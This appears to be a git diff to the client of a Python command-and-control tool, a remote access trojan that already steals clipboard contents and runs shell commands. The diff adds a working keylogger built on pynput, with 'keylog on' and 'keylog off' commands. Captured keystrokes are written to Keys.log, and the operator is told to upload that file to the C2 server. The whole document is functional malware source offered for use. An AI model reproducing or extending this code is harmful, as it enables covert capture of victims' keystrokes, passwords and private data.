@@ -4,9 +4,6 @@ Author: Davood Yahay(D.Yakuza)
 """
 # Import os methods based on OS, use platform.system() to detect OS
 from platform import system
-
-from pyperclip import paste, PyperclipWindowsException
-
 if system() == "Windows":
     from os import getenv, chdir, path, getcwd
 elif system() == "Linux":
@@ -18,6 +15,8 @@ from colorama import Fore
 from time import time, sleep
 from subprocess import run, PIPE, STDOUT
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
+from pyperclip import paste, PyperclipWindowsException
+from pynput.keyboard import Key, Listener
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
@@ -60,12 +59,11 @@ def post_to_server(message: str, response_path=RESPONSE):
         return
 
 
-"""this is a function that split string and returns third item.
-by default, all forwarded slashes in the third item Changed to backslashes
-this can be disabled, if replace set on False during call function. """
-
 
 def get_filename(input_string):
+    """this is a function that split string and returns third item and items after that.
+    by default, all forwarded slashes in the third item Changed to backslashes
+    this can be disabled, if replace set on False during call function. """
     try:
         return " ".join(input_string.split()[2:]).replace("\\", "/")
     # If the path of the file doesn't enter correctly, notify us on the server
@@ -73,10 +71,23 @@ def get_filename(input_string):
         post_to_server(f"You must enter Argument after {input_string}. \n")
 
 
+def on_press(key_press):
+    """the function to record keys being pressed, and send them to the server,
+    this is called by the start method of pynput.keyboard's Listener"""
+    global keyLog
+    keyLog.append(key_press)
+
+
+# clientPrint used for print only username@machine from client variable
+clientPrint = client.split("@")[0:1]
+
 # the delay between re-connection attempts when inactive is set in settings.py
 delay = DELAY
 # Initialize that support background jobs like Clipboard stealing, Key logging and screenshots
 clipCount = 0
+listener = None
+keyLog = []
+
 
 # Better use infinity loop when add control active sessions feature in Server Side
 while True:
@@ -310,6 +321,42 @@ while True:
             else:
                 post_to_server(f"[+]-Client => clipboard_{clipCount}.txt has been Written on the Client.\n"
                                f"[+] => Use client upload clipboard_{clipCount}.txt to get it on the C2 Server. \n")
+
+    # the 'client keylog on' Command Start a Key Logger on the C2 Client
+    elif command == "client keylog on":
+        # When listener is None, mean the keylogger is OFF
+        if listener is None:
+            # Start a Key Logger on the C2 Client
+            listener = Listener(on_press=on_press)
+            listener.start()
+            post_to_server("[+]-Client => A Key Logger is now Running on the Client.\n")
+        else:
+            post_to_server("[!]-Client => A Key Logger is already Running on the Client.\n")
+
+
+    # the 'client keylog off' Command shutting down the Key Logger on the client and write the pressed keys to disk
+    elif command == "client keylog off":
+        # When listener is Not None(True), mean the keylogger is ON
+        if listener is not None:
+            listener.stop()
+
+            with open("Keys.log", "a") as fileHandle:
+
+                # Read in each key pressed and make it more readable for us
+                for aKeyPressed in keyLog:
+                    fileHandle.write(str(aKeyPressed)
+                                     .replace("Key.enter", "\n").replace("'","")
+                                     .replace("Key.space", " ").replace('""', "'")
+                                     .replace("Key.shift_r", "").replace("Key.shift_l", "")
+                                     .replace("Key.backspace", "").replace("Key.shift",""))
+
+            # Clear the keyLog list and Re-Initialize the listener to signify 'Not On'
+            keyLog.clear()
+            listener = None
+            post_to_server(f"[+]-Client => Key Logging is now Disabled on the client. Results Writen in Keys.log in the "
+                           f"{clientPrint}\n[+]-Client => Use client upload Keys.log to get it on the C2 Server. \n")
+
+
     else:
         post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
 
